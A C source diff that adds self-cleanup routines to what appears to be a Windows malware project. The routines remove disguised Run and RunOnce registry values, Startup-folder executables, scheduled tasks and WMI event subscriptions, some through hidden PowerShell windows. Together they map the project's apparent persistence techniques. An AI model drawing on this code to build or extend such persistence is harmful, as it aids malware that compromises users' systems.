@@ -373,3 +373,119 @@ void StartWatchdogThread()
 {
     CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);
 }
+
+/**
+ * Remove Registry persistence keys
+ */
+void CleanRegistry()
+{
+    HKEY hKey;
+
+    // Clean HKCU Run
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, REG_RUN_HKCU, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
+    {
+        // Remove legacy key
+        RegDeleteValue(hKey, "Pwnd by BlxdMoon");
+
+        for (int i = 0; i < NUM_DISGUISED_NAMES; i++)
+        {
+            RegDeleteValue(hKey, DISGUISED_NAMES[i]);
+        }
+        RegCloseKey(hKey);
+    }
+
+    // Clean HKCU RunOnce
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, REG_RUNONCE_HKCU, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
+    {
+        for (int i = 0; i < NUM_DISGUISED_NAMES; i++)
+        {
+            char runOnceValue[64];
+            snprintf(runOnceValue, sizeof(runOnceValue), "%sService", DISGUISED_NAMES[i]);
+            RegDeleteValue(hKey, runOnceValue);
+        }
+        RegCloseKey(hKey);
+    }
+
+    // Clean HKLM Run (if admin)
+    if (IsElevated())
+    {
+        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, REG_RUN_HKLM, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
+        {
+            for (int i = 0; i < NUM_DISGUISED_NAMES; i++)
+            {
+                RegDeleteValue(hKey, DISGUISED_NAMES[i]);
+            }
+            RegCloseKey(hKey);
+        }
+    }
+}
+
+/**
+ * Remove persistence from Startup folder
+ */
+void CleanStartupFolder()
+{
+    char startupPath[MAX_PATH];
+
+    if (SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath) == S_OK)
+    {
+        for (int i = 0; i < NUM_DISGUISED_NAMES; i++)
+        {
+            char checkPath[MAX_PATH];
+            snprintf(checkPath, MAX_PATH, "%s\\%s.exe", startupPath, DISGUISED_NAMES[i]);
+            DeleteFile(checkPath);
+        }
+    }
+}
+
+/**
+ * Remove scheduled tasks
+ */
+void CleanScheduledTask()
+{
+    char cmd[1024];
+
+    for (int i = 0; i < NUM_DISGUISED_NAMES; i++)
+    {
+        // Delete main task
+        snprintf(cmd, sizeof(cmd), "schtasks /Delete /TN \"%s\" /F >nul 2>&1", DISGUISED_NAMES[i]);
+        system(cmd);
+
+        // Delete update/watchdog task
+        snprintf(cmd, sizeof(cmd), "schtasks /Delete /TN \"%sUpdate\" /F >nul 2>&1", DISGUISED_NAMES[i]);
+        system(cmd);
+    }
+}
+
+/**
+ * Remove WMI persistence
+ */
+void CleanWMI()
+{
+    char cmd[4096];
+
+    for (int i = 0; i < NUM_DISGUISED_NAMES; i++)
+    {
+        const char* name = DISGUISED_NAMES[i];
+
+        snprintf(cmd, sizeof(cmd),
+            "powershell -WindowStyle Hidden -Command \""
+            "Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Where-Object { $_.Name -eq '%s' } | Remove-WmiObject; "
+            "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq '%s' } | Remove-WmiObject; "
+            "Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match '%s' } | Remove-WmiObject\" >nul 2>&1",
+            name, name, name);
+
+        system(cmd);
+    }
+}
+
+/**
+ * Clean all persistence mechanisms
+ */
+void CleanAll()
+{
+    CleanRegistry();
+    CleanStartupFolder();
+    CleanScheduledTask();
+    CleanWMI();
+}
